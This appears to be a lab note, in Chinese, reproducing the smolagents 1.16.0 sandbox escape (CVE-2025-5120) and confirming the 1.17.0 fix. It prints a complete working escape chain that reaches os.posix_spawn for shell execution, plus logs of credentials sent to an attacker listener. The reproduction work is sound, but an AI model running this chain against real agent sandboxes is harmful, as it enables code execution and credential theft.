# Hop 3 — smolagents 1.16.0 沙箱逃逸 (CVE-2025-5120)

## G1 双版本验证 — PASS (2026-11-20)

| 版本 | wheel | 结果 |
|---|---|---|
| 1.16.0（受影响） | 官方 PyPI wheel | escape SUCCESS：授权 `import warnings` → map/getattr 链原生调用绕过全部 AST 检查 → `os.posix_spawn` 执行 shell → DB 凭据文件完整外泄到攻击者监听器 |
| 1.17.0（修复） | 官方 PyPI wheel | 同一 PoC 第一行即被拦：`InterpreterError: Forbidden access to module: sys`（exit 2），监听器零请求 |

### 真实漏洞代码（官方 wheel，已逐行核实）

`smolagents/local_python_executor.py` 1.16.0 的两处缺陷共同构成逃逸面：

1. `safer_eval` 只检查**流经 evaluate_ast 节点的返回值**（ModuleType 按 `__name__` 对授权表检查；FunctionType 按 11 项 DANGEROUS_FUNCTIONS 黑名单检查）。
2. `evaluate_name` 直接 `return static_tools[name.id]`，static tools（`getattr`=nodunder_getattr、`map`、`list`、`type`、`setattr` 等）**裸返回、调用结果不检查**。

修复 commit `33a942e62b6fbf6a35d41f1c735bda2d64c163d0`（1.17.0，PR #1375 "Prevent submodules through indirect attribute access"）：新增 `check_safer_result` + `safer_func`，**每个 static tool 调用结果**都过 `check_safer_result`。

### 已验证逃逸链（1.16 全通 / 1.17 全断）

```python
import warnings                                     # 合法授权 import
r = list(map(getattr, [warnings], ["sys"]))        # 原生 getattr → 真实 sys 模块
d = list(map(getattr, r, ["modules"]))             # sys.modules dict（非 ModuleType，过）
getters = list(map(getattr, d, ["get"]))           # dict.get（非黑名单函数，过）
osm = list(map(getters[0], ["os"], [None]))        # [os 模块]，包在 list 里过检查
spawn = list(map(getattr, osm, ["posix_spawn"]))   # os.posix_spawn 不在 DANGEROUS_FUNCTIONS
pid = list(map(spawn[0], ["/bin/sh"], [["sh","-c",cmd]], [dict()]))  # RCE
```

要点：**每个中间值都包在 list 里、每次提取都经 map 原生调用**——没有任何 evaluate_ast 节点持有 ModuleType 或黑名单函数，1.16 的全部检查都不触发。`os.popen`/`os.system` 在黑名单内但 `os.posix_spawn` 不在。

### 机制考古笔记

- 1.16 的 `evaluate_subscript`/`evaluate_attribute` 结果检查**已存在**——所以 `warnings.sys`、`d["os"]`、`sys.modules["os"]` 等直接路径全部被拦（实测确认）。逃逸必须依赖 static tools 的**调用结果不检查**这一缺口。
- `getattr`（nodunder_getattr）只拦 dunder 字符串，不拦 `sys`/`modules`/`get`/`posix_spawn`。
- `str.format("...{0.__init__.__globals__}...")` 可读任意属性链（库内解析，绕过 AST dunder 检查）但只能得到字符串化结果，不能调用——不足以完成逃逸，可作为信息泄露原语记录。
- 服务端注意：官方 `evaluate_python_code` 带 `@timeout`（signal.alarm），只能在主线程用；服务进程内需直接驱动同一 `evaluate_ast` 管线（语义不变，已在 service.py 注释中说明）。

### 场景声明（PLAN.md §3）

`/analyze` 沙箱服务（B 机上跑用户提交的分析代码片段）为合成部署场景，模仿 smolagents 的真实使用方式（LocalPythonExecutor + BASE_PYTHON_TOOLS + 部署方增补的 import 白名单；`warnings` 是任何现实白名单里都无害的成员）。逃逸原语 100% 来自官方 wheel。

## 运行记录

- 项目：`docker compose -p hop3-vuln`（17881）/ `-p hop3-fix`（17882）
- exploit：`attacker/reference_exploit.py`，退出码 0=逃逸+外泄成功、2=被沙箱拦截（修复版）、3=无外泄、4=战果为空
- 1.16 运行输出：
  ```
  sandbox result: {'is_final': False, 'result': '27', 'version': '1.16.0'}
  loot received (77 bytes): b'db-user=admin\ndb-pass=HOP3-SECRET-f893a270ecf16654\ndb-apikey=model-c-key-9f2e'...
  SUCCESS
  ```
- 1.17 运行输出：
  ```
  sandbox rejected code (400): {"error":"InterpreterError: Forbidden access to module: sys"}
  FAIL: escape blocked (patched wheel?)
  exit=2
  ```
- 本机（macOS，python 3.13 直装 wheel）另做了纯沙箱级 RCE 验证：`posix_spawn("/bin/sh", ["sh","-c","id > /tmp/pwned"], {})` 真实执行，`/tmp/pwned` 内容为本机 uid。
